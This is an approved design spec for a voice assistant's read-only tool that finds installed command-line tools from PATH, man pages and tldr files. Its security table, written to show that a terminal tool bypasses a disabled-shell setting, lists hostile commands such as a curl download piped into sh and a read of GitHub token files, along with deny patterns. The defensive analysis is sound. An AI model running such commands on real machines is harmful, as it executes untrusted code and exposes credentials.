---
status: approved
issue: 82
intent: intent/2026-09-24-82-installed-commands.md
---

# Spec: find an installed command-line tool by what it does, without finding becoming running

Line numbers are against `origin/main` at `93c6dac`. The measurements were
taken on p620 on 2026-09-24. PATH and MANPATH came from the running daemon
(`/proc/220215/environ`, `omarchy-voice.service`). Two scratch scripts, which
are not committed, did the work. One drove the real `Executor` through
`tests/test_terminal.py`'s `FakeTmux`, so no keys were sent. The other built a
prototype index by listing PATH directories and reading tldr and man page
files. Nothing on PATH was executed, and neither script made a network call.

## The intent's open questions, answered

The approver approved the intent without answering its four open questions.
Each answer below is a decision this spec makes, and **each can be rejected at
this gate**.

### Q1. Should `run_in_terminal` work with `allow_shell` off?

The question claims that `run_in_terminal` makes `cli.py:248` untrue. This is
what it does today on a default `Config()` (`allow_shell = False`, main's own
deny and confirm lists), with a fake tmux:

| Command sent to `run_in_terminal` | Outcome |
|---|---|
| `run_shell {"command": "id"}` (for comparison) | refused: "shell access is disabled" |
| `ffmpeg -i in.mp4 out.mp3` | **sent** to the pane |
| `python3 -c 'import os; os.system("id")'` | **sent** |
| `bash -c 'echo pwned > ~/x'` | **sent** |
| `curl -s https://example.com/x -o /tmp/x && sh /tmp/x` | **sent**, because `\bcurl\b.*\|\s*(ba)?sh` only matches a pipe |
| `find ~ -name '*.bak' -delete` | **sent** |
| `cat ~/.config/gh/hosts.yml` | denied (#100 secret path) |
| `ssh host` | denied (`\bssh\b`) |
| `rm -rf ~/tmp` | denied |
| `reboot` | held for confirmation |

`tools_for(Config())` offers `run_in_terminal` and withholds `run_shell`
(`tools.py:1419-1432`). The claim is therefore true. With `allow_shell` off,
`run_in_terminal` is a general shell (`tools.py:3676-3697`, `send-keys` at
`3697`), and the deny list is its only barrier. The README says that is not
enough: "a blocklist was never meant to be the only barrier" (the #22 section,
`README.md:838-841`). `cli.py:248-253` ("`allow_shell` is the whole answer")
and `README.md:257` ("`allow_shell` means what it says") are both wrong today.

**Decision: (c). With `allow_shell` off, every `run_in_terminal` command is
held for confirmation. With it on, nothing changes. This belongs in its own
issue, not in #82.**

- (b), gating `run_in_terminal` on `allow_shell`, would remove the one visible
  executor on a default install. That breaks the persona's documented use
  (`persona.py:118-121`, `README.md:585`) and leaves #82 with no way to act.
- (a), keeping it as it is and documenting it, would write down that an open
  microphone can run `python3 -c …` without asking on an install that
  presents itself as having the shell off.
- (c) uses the confirm gate that already exists (`Policy.check` raising
  `NeedsConfirmation`, `tools.py:207-212`, and the pending slot at
  `tools.py:1771-1781`). It is visible and it asks first. `allow_shell` then
  becomes true as "nothing runs a shell command without a yes", and
  `shell_status` can say so. The intent's version, "not the user's literal
  words", is dropped: the executor cannot know what was said, and a rule it
  cannot check is not a guard.
- **Why this is out of scope.** The gap is on main today and has nothing to do
  with finding. #82's finder adds no way to run anything. Fixing the gap
  touches `run_in_terminal`, `shell_status`, the README's security section and
  their tests, which is a separate review. **A new issue should be filed:
  "`run_in_terminal` runs any command with `allow_shell` off; hold each one
  for confirmation".** This spec's table is its evidence. Until that lands,
  #82 does **not** add persona text that steers found tools into
  `run_in_terminal` (see Design, step 4). Running stays exactly as common as
  it is today.

### Q2. Is the finder alone enough for this issue?

**Yes. Scope (1) only.** This follows from Q1: the only execution change worth
making is a security change that stands on its own. The finder meets every
outcome in the intent that is about knowing ("answers from what is actually
installed", "reported as not installed", "confirms X exists", "draws on X's
own examples", "no network call"). The outcome "when one is run, it runs
through an existing, gated executor" already holds with no change.

### Q3. Where do descriptions come from?

The candidates, measured:

| Source | Commands described | Build | Cost and problems |
|---|---|---|---|
| `tldr` CLI per lookup | n/a | **1.7 s per lookup** (intent) | Network call on every lookup. Rejected by the intent's constraint. |
| tldr pages in nixpkgs | — | — | **Not packaged.** `nix search nixpkgs tldr` returns clients only (`tldr` 3.4.4, `tlrc`, `tealdeer`, `outfieldr`, `tldr-hs`). There is no `tldr-pages` attribute. |
| tldr pages as a flake input (`github:tldr-pages/tldr`, `flake = false`) | 1,192 here | — | Would put **27 MB** (`common` 19 MB and `linux` 8 MB) into the closure, plus a lock to bump. Possible, but not needed yet (see below). |
| Man page `NAME` lines, read from files on MANPATH | **1,579** | **0.28 s** | Already on disk, and matches the installed version, because the man page ships with the binary. No index is needed. The intent's `apropos` problem does not apply. |
| tldr page files, read from a local client cache when one exists | 1,192 | 0.17 s | Optional. Read as files, never through the CLI, and never refreshed. |
| `--help` / `--version` | — | — | **Rejected.** Asking an unknown executable what it does means running it. This breaks the intent's first constraint. |

The ranking test used 12 requests whose expected tool is installed. `pdftotext`
is not installed here, so "pdf to text" was left out of the score. It was still
run, and it returned `ps2ascii` first. Rank of the expected tool in the top 8:

| Descriptions | Top-1 | Top-8 |
|---|---|---|
| man only | 6/12 | 8/12 |
| tldr only (examples scored) | 3/12 | 9/12 |
| tldr, else man (examples scored) | 3/12 | 9/12 |
| **tldr + man joined, examples not scored** | 3/12 | **10/12** |

**Decision: man `NAME` lines are the source that is always present. tldr page
files add to them when a local cache exists. For a command that has both, the
two descriptions are joined for matching. Example lines are shown, not
scored. Nothing new goes into the flake.**

- Man pages are always there. A default install gets 1,579 described commands
  and needs no download.
- tldr adds 281 commands that man pages do not describe (1,579 → 1,860,
  `btop` among them) and **examples**, which is what "draw on X's own
  examples" needs. When there is no cache, an exact-name lookup falls back to
  the man page's `SYNOPSIS` lines.
- Scoring the example text made ranking worse. Example lines mention every
  tool that touches a video, so `mcat`, `obs` and `steam` ranked with `ffmpeg`.
- The tldr cache on p620 is a runtime download (July 2026). The finder reads it
  when it is present and never depends on it, which the intent's constraint
  allows ("or they are optional"). Stale pages still describe the tool; the
  staleness only ever mattered because the CLI refreshed over the network.
- A flake input for tldr pages is the follow-up if a default install's answers
  turn out to need examples. It is 27 MB and the model can ask for the man
  page instead, so it is not added now.

**Is a command with neither description in the index?** **Yes for an exact
name, no for a purpose search.** 1,402 of the 3,262 commands on PATH have no
description, and they are mostly helpers. A description is what makes a
command show up in a purpose search, so they cannot match one. Asked by name
(`nix-locate`, `serie`), the finder still answers "installed, no description
on this machine". That keeps real tools without flooding purpose results with
helpers.

### Q4. This machine's `deny_patterns_replace = true`

**Out of this repo, and already tracked by #109 (OPEN).** #109 proposes
`deny_patterns_remove` and a `doctor` warning. The fix for p620 today is to copy
#100's rules into the Home Manager config in the NixOS config repo. #82
changes nothing here. The finder is read-only, so p620's posture only affects
running a found tool, which is Q1's issue. One interaction to note: the deny
list applies to reads (`tools.py:204-208`), so on a default install a lookup
that says "ssh" is refused. `find_app` does the same thing today:
`find_app {"query": "ssh client"}` returns `refused: blocked by deny rule
/\bssh\b/`. See Risks.

## Design

### 1. `capabilities.py`: a command index next to `app_index`

The index is separate from `find_apps` (`capabilities.py:521-560`). Only
`_words` (`capabilities.py:433`) is shared. `find_apps`'s tiers score how
closely a *name* matches: whole name, initials, every word in the name. They
require every query word to appear in the entry, and 70 is the best score a
description alone can reach. For commands, most requests describe a purpose.
"convert a video" against ffmpeg's "Video conversion tool" scores 0 under
those tiers, because "convert" is not "conversion". `clear_match`
(`capabilities.py:563`) decides whether to launch without asking, and the
finder never launches anything. The #96 generic-part rule is about
reverse-DNS desktop ids, and PATH names are not ids. Nothing is reused from
the matcher, and `find_app`/`launch_app` are not touched. "open zed" still
resolves through `find_apps`.

- `command_index() -> dict[str, dict]` maps each name to
  `{"desc": str, "src": "tldr"|"man"|"", "examples": [(text, cmd)], "synopsis": str}`.
  - **PATH:** `os.environ["PATH"]` with every `/nix/store/…` entry left out.
    Those entries are the wrapper's private runtime inputs, not what the user
    installed. Here they are 29 of 43 directories and add 24 commands, such as
    `whisper-cli`, `piper` and `whisper-cpp-download-ggml-model`, that are not
    on the user's own PATH. The first directory to list a name wins, and so do
    regular files with `os.access(X_OK)`, as a shell resolves them. Names
    starting with `omarchy-`, `nixarchy-` or `.` are skipped, because
    `omarchy_help` covers them.
  - **Man:** `MANPATH` directories, `man1` and `man8`. `.gz` files go through
    `gzip`. The first 8 KB of each is searched for `.SH NAME` (man macros) or
    `.Nd` (mdoc), and the text after `\-` is kept.
  - **tldr:** `~/.cache/tldr/pages/{linux,common}/<name>.md` (the Python
    client, which is what is installed here). The `> ` lines are the
    description, leaving out "More information" and "See also". The `- ` and
    `` ` `` pairs are the examples. An alias page ("This command is an alias
    of `magick mogrify`") is resolved one hop to the target's page.
    ponytail: one known cache path; add tealdeer's or tlrc's when a machine
    has one.
- **Cache.** The index is built on first use and held in-process. It is keyed
  on `(realpath, st_mtime_ns)` of every PATH, man and tldr directory. The key
  takes **1.0 ms** for 57 directories and a rebuild takes **0.30 s**. An
  install changes a profile symlink's target or a directory's mtime, so a new
  command is findable on the next lookup without a restart ("stale is worse
  than slow"). A full scan per call like `app_index` was measured and
  rejected: at 0.3 s, it costs 10 times what `app_index` does.
- `find_commands(query, limit=8) -> list[tuple[float, str, dict]]`:
  - If the query is exactly a name on PATH, that command comes first
    (described or not). This is the "is X installed" path.
  - Otherwise, a word-overlap score weighted by IDF over the name's parts and
    the joined description. Stop words are removed and words are cut to a
    5-character prefix, so "convert" meets "conversion" and "colour" does not
    meet "color" (see Risks). Matching every query word multiplies the score
    by 1.5. Ties go to tldr, then to the shorter name.
  - When nothing matches exactly, up to 3 close spellings come from
    `difflib.get_close_matches` over all names. `yt-dl` finds `yt-dlp`.

### 2. `tools.py`: a read-only tool, `find_command`

- Schema, after `find_app` (`tools.py:797-812`):
  `{"name": "find_command", "description": "Which command-line tools are installed for a name or a purpose — \"ffmpeg\", \"resize images\", \"json\". Returns names, what each does, and for an exact name its usage examples. Runs nothing.", "input_schema": {query: string, required, additionalProperties: false}}`.
- `READ_ONLY_TOOLS` (`tools.py:58-60`) gains `"find_command"`. The confirm
  gate never holds it and dry run still runs it (`tools.py:1784`, `1811`).
  Deny rules still apply (#100).
- `describe` (`tools.py:1880` neighbourhood): `find commands: '<query>'`.
- The handler `_tool_find_command(query)` returns plain text:
  - rows of `  name — description`, with `(no description)` when there is none;
  - when the top hit is an exact name, up to 4 examples (tldr) or the
    `SYNOPSIS` (man) under it;
  - when nothing matched: "nothing installed matches '<q>'", plus the close
    spellings if there are any, and "it is not installed under that name";
  - output capped like other lookups, and it never includes a path.
- **The #94 allowlist needs no change.** `BUILTIN_TOOLS = ("Read",
  "ToolSearch")` (`claude_backend.py:123`) is about Claude Code's built-ins.
  The brain sees `mcp__omarchy__find_command` through our MCP server, whose
  list is `tools_for(config)` (`mcp_server.py:129`). `_is_read`
  (`claude_backend.py:106-110`) takes it from `READ_ONLY_TOOLS`, so dry run
  allows it with no second list. Realtime gets it from `tools_for` as well
  (`realtime.py:547`).
- **#69:** one static schema of about 80 tokens is added to the tool list.
  None of the index goes into the prompt.

### 3. `capabilities.py` manifest text

One sentence under "Applications installed here" (`capabilities.py:860-863`),
which is static text, so the cache key is unchanged: *"For command-line tools,
call find_command before saying whether something is installed or how to use
it."*

### 4. `persona.py`: no change to run steering

The steering line about `run_in_terminal` (`persona.py:118-121`) stays as it
is until the Q1 issue lands. The manifest sentence in step 3 is the only new
prompt text.

### 5. `tools/verify_find.py`: a command set

Add `COMMAND_REQUESTS`. These are the 14 requests in the table below, plus the
exact names `ffmpeg`, `mogrify`, `nix-locate`, `yt-dl` (a misspelling) and
`notarealtool`. Each prints its top 8 and the time it took, against the real
machine, and runs nothing, as the #70 set does.

### Prototype results (p620, daemon PATH, joined descriptions)

3,262 commands, 1,860 described. Index build 0.30 s, query 2–5 ms.

| Request | Top results |
|---|---|
| convert a video | mcat, **ffmpeg**, obs, mpv |
| json query | bq, cpan, … (**jq missed**; it is 1st with man only) |
| pdf to text | ps2ascii, gs (`pdftotext` not installed) |
| resize an image | **mogrify**, magick-script, **magick**, montage |
| check disk usage | df, du, **duf**, dua, ncdu |
| download a youtube video | **yt-dlp** |
| ssh to a host | rsync, **ssh** (2nd without example scoring) |
| take a screenshot | gnome-screenshot, **grim** (2nd) |
| copy to clipboard | **wl-copy** |
| pick a color / colour | **hyprpicker** / hyprpicker 3rd (the stem misses "colour") |
| find files by name | pgrep, find (**fd missed**: "An alternative to find") |
| search text in files | lzgrep …, **rg** 3rd |
| system monitor | **btop** 4th |
| `mogrify` / `ffmpeg` (names) | exact, first; `mogrify` resolves to `magick mogrify` |

Top-8 finds 10 of 12, top-1 finds 3. **Purpose search returns candidates, and
the model picks from them.** That is why the tool returns 8 rows with their
descriptions and not 1. The model does the rest: it can rephrase, or look a
name up exactly, and an exact name always resolves.

## Alternatives rejected

- **Reusing `find_apps` tiers and `clear_match`.** They are built for names and
  for deciding whether to launch. They score description-only matches at 70
  at best, need every word, and have no stemming, so "convert a video" gets
  nothing. The finder has no launch decision for `clear_match` to make.
- **Curated fixed-argv wrappers, scope (2).** Rejected in the intent. They do
  not scale, and the argument slots bring the risk back.
- **One index shared with #83.** #83 (services and MCP servers) is still an
  open intent. Sharing a shape with it before it has a spec is speculative.
  The row dict is simple enough to line up later.
- **Shipping tldr pages through the flake now.** 27 MB and a lock to maintain,
  for examples. Man pages and the model can live without them for now. This
  is the follow-up if they cannot (Q3).
- **Running `--help`, or the `tldr` CLI.** One executes arbitrary binaries and
  the other makes a network call. Both break the intent's constraints.
- **Embeddings or semantic search.** Measured lexical top-8 is 10/12, and the
  caller is a model that can rephrase. A model in the index adds a dependency
  and a download for a gap the caller already covers.
- **Gating or changing `run_in_terminal` in this issue.** See Q1. It is a real
  fix and it is separate.

## Risks

- **Ranking misses.** In this set, `jq` for "json query" and `fd` for "find
  files by name". The model gets 8 candidates and can look a name up exactly.
  `verify_find.py` reports misses so they can be watched. If real requests
  keep missing, the next step is a small synonym table, not a model.
- **British spelling.** "colour" does not match "color" after stemming, so
  hyprpicker ranks 3rd with a low score. This is accepted. One synonym pair
  would fix it if it keeps happening.
- **Deny rules apply to the query.** `find_command "ssh"` is refused on a
  default install (`\bssh\b`), as `find_app` already is. This is consistent
  with #100 and surprising to a user. On p620, whose replaced list has no ssh
  rule, it is not refused. If it bites, the fix is in #100's policy, not here.
- **Daemon PATH differs from the user's shell PATH.** Store entries are
  dropped, but a devenv or a PATH set only in the interactive shell is not
  visible to the daemon. A tool installed only per project is reported as not
  installed. This is accepted: that tool is not "installed on the system".
- **Descriptions in untrusted text.** tldr and man text goes into a tool
  result. It is the same class of content as `read_terminal` output (#101),
  and it comes from files installed by the user's own package manager or the
  tldr project. It is not escaped, and no instructions are taken from it.
- **Memory.** 3,262 small dicts, around 1–2 MB, held for the daemon's
  lifetime.
- **Not a Nix host.** Without `/nix/store` entries and with a plain
  `/usr/share/man`, the code path is the same and the store filter does
  nothing.
- **Running is still ungated on default installs** until the Q1 issue lands.
  #82 does not make this worse and does not add steering toward it.

## Verification

- **Unit tests** (`tests/test_find_commands.py`, which imports `_isolated`
  first, #99). The fixtures are temporary directories holding a fake PATH
  (executable and non-executable files, an `omarchy-*` name, a `/nix/store`
  prefix entry), a fake MANPATH (a gzipped `.SH NAME` page and an mdoc `.Nd`
  page), and a fake tldr dir (a normal page and an alias page). They assert:
  - descriptions are parsed from man, mdoc and tldr, and an alias is resolved;
  - a non-executable file, an `omarchy-*` name and store PATH entries are
    left out;
  - an exact name comes first even with no description;
  - a purpose query finds a command by its description;
  - "not installed" includes close spellings;
  - the cache rebuilds after a new file appears in a PATH directory, and does
    not rebuild when nothing changed;
  - **nothing is executed**: `subprocess.run`, `subprocess.Popen` and
    `os.system` are patched to raise for the whole test class.
- **Tool wiring** (in the same file, the way `tests/test_find_apps.py:305-320`
  does it for `find_app`): `find_command` is in `READ_ONLY_TOOLS` and in
  `tools_for(Config())`. Add it to `READ_FAKES` in `tests/test_policy.py:663`
  so a query of "reboot" runs and is not held. A query of "ssh" is denied.
- `python3 -m unittest discover -s tests` passes, and so does `pytest tests`.
- `python3 tools/verify_find.py` on p620 prints the command set. Top-8 hits
  at least 10 of the 12 above, every exact name resolves, `notarealtool` says
  it is not installed, and each query takes under 50 ms after the first.
- **By hand, in dry run:** `omarchy-voice -n say --no-confirm "what do I have
  installed that can resize a batch of images"` names `mogrify`/`magick` from
  a `find_command` call and does not say "likely". The intent's ffmpeg request
  calls `find_command ffmpeg` before building a command.
- **No network:** the unit tests run with network access unshared
  (`unshare -rn python3 -m unittest …`) and still pass.
